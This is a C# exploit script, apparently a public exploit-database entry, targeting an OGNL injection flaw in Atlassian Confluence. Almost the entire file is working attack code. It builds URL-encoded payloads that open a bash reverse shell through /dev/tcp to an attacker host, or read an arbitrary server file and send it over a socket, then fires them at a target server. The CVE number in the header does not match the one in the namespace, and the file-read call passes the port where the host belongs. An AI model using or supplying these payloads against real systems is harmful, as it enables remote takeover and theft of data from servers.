// Exploit Title: Confluence Namespace OGNL Injection
// Date: June 3, 2022
// Exploit Author: Jacob Baines
// Vendor Homepage: https://www.atlassian.com/software/confluence
// Software Link: https://www.atlassian.com/software/confluence/download-archives
// Vendor Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
// Version: All LTS <= 7.13.6 and all others <= 7.18.0
// Tested on: 7.13.6 LTS / Ubuntu 20.04
// CVE : CVE-2022-26123


namespace CVE_2022_26134;

internal class Program
{
    static void Main(string[] args)
    {
        Parser.Default.ParseArguments<CommandLineOptions>(args)
            .WithParsed(o => {
                if (o.rhost != null)
                    LocalVar.rhost = o.rhost;
                if (o.rport != null)
                    LocalVar.rport = o.rport;
                if (o.lhost != null)
                    LocalVar.lhost = o.lhost;
                if (o.lport != null)
                    LocalVar.lport = o.lport;
                if (o.protocol != null)
                    LocalVar.protocol = o.protocol;
                if (o.reverse != null)
                    LocalVar.reverse = o.reverse;
                if (o.fork != null)
                    LocalVar.fork = o.fork;
                if (o.nc != null)
                    LocalVar.nc = o.nc;
                if (o.read != null)
                    LocalVar.read = o.read;
            });

        Start();
    }
    

    static void Start()
    {
        string revers = "", read = "";
        
        if (LocalVar.reverse && LocalVar.read != null)
        {
            Console.WriteLine("Select only Reverse OR ReadFile not both");
            return;
        }
        else if (LocalVar.reverse)
        {
            revers = ReverseShell(LocalVar.lhost, LocalVar.lport);
            PushData(LocalVar.rhost, revers);
        }
        else if (LocalVar.read != null)
        {
            read = ReadFile(LocalVar.lport, LocalVar.lport, LocalVar.read);
            PushData(LocalVar.rhost, read);
        }
        
    }

    private static async void PushData(string domain, string exploit)
    {
        Console.WriteLine($"https://{domain}/{exploit}");
        var result = "";
        HttpClientHandler httpClientHandler = new HttpClientHandler();
        httpClientHandler.AllowAutoRedirect = false;

        try
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = new HttpResponseMessage();
                response = await client.GetAsync($"https://{domain}/{exploit}");

                // dump contents of header
                //Console.WriteLine(response.Headers.ToString());
                
                if((int)response.StatusCode == 302)
                {
                    response.Headers.TryGetValues("X-Cmd-Response", out IEnumerable<string> XCmd);
                    Console.WriteLine(XCmd);
                }

                if (response.IsSuccessStatusCode)
                {
                    result = ((int)response.StatusCode).ToString();
                }
                else
                {
                    result = ((int)response.StatusCode).ToString();
                }
            }
        }
        catch (HttpRequestException hre)
        {
            result = "Server unreachable";
        }   
        
/*        var client = new HttpClient(httpClientHandler);
        var response = client.GetAsync($"https://{domain}/{exloit}").Result;
        
        var content = response.Content.ReadAsStringAsync().Result;
        Console.WriteLine(content);*/
    }

    static string ReverseShell(string lhost, string lport)
    {
        Console.WriteLine("[+] Generating a reverse shell payload");
        string exploit = "${new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/' "+ lhost + "'/'" + lport + "' 0>&1').start())}";
        string Encoded = HttpUtility.UrlEncodeUnicode(exploit);
        return Encoded;
    }

    static string ReadFile(string lhost, string lport, string FilePath)
    {
        Console.WriteLine("[+] Generating a payload to read: ' + args.read_file");
        string exploit = "${new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get('" + FilePath + "' )));var sock = new java.net.Socket('" + lhost + "', '" + lport + "'); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream())); output.write(data); output.flush(); sock.close();\")}";
        string Encoded = HttpUtility.UrlEncodeUnicode(exploit);
        return Encoded;
    }
}